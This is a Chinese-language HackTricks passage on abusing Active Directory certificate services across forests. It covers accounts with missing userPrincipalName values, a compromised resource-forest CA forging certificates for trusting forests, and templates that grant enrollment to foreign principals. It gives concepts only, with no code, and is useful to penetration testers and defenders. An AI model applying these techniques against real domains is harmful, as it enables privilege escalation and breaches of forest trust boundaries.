<figure><img src="../../../.gitbook/assets/image (7) (1) (2).png" alt=""><figcaption></figcaption></figure>

或者，我们还可以入侵任何未设置`userPrincipalName`或`userPrincipalName`与该帐户的`sAMAccountName`不匹配的用户帐户。根据我的测试，缺省的域管理员`Administrator@corp.local`默认情况下没有设置`userPrincipalName`，并且该帐户在LDAP中应该具有比域控制器更多的特权。

## 使用证书入侵林

### CA信任破坏林信任

**跨林证书申请**的设置相对简单。管理员将资源林的**根CA证书**发布到**帐户林**，并将资源林的**企业CA证书**添加到**每个帐户林**的**`NTAuthCertificates`**和AIA容器中。明确地说，这意味着**资源林中的CA对其管理PKI的所有其他林具有完全控制权**。如果攻击者**入侵了该CA**，他们可以为资源林和帐户林中的所有用户**伪造证书**，从而破坏了林的安全边界。

### 具有注册权限的外部主体

在多林环境中，组织还需要注意企业CA**发布授予已验证用户或外部主体（属于企业CA所属林之外的用户/组）注册和编辑权限的证书模板**。\
当帐户**通过信任进行身份验证**时，AD会将**已验证用户SID**添加到正在进行身份验证的用户令牌中。因此，如果一个域具有一个授予已验证用户注册权限的企业CA模板，不同林中的用户可能会**注册该模板**。同样，如果一个模板明确授予**外部主体注册权限**，那么将创建一个**跨林访问控制关系**，允许一个林中的主体**在另一个林中注册模板**。

最终，这两种情况都会**增加从一个林到另一个林的攻击面**。根据证书模板的设置，攻击者可能会滥用此功能以在外部域中获得额外特权。

## 参考资料

* 此页面的所有信息均来自[https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在**网络安全公司**工作吗？您想在HackTricks中**为您的公司做广告**吗？或者您想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**

</details>
